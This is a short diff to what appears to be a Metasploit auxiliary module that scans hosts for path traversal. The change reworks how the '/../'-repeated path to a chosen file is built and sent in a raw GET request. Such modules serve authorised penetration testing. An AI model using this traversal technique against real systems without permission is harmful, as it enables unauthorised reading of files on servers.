@@ -41,11 +41,11 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_host(ip)
     filename = datastore['FILEPATH']
-    traversal = '/../' * datastore['DEPTH'] + filename
+    traversal = normalize_uri(target_uri.path, '/../' * datastore['DEPTH'], filename)
 
     res = send_request_raw({
       'method' => 'GET',
-      'uri'    => normalize_uri(traversal)
+      'uri'    => traversal
     })
 
     unless res && res.code == 200
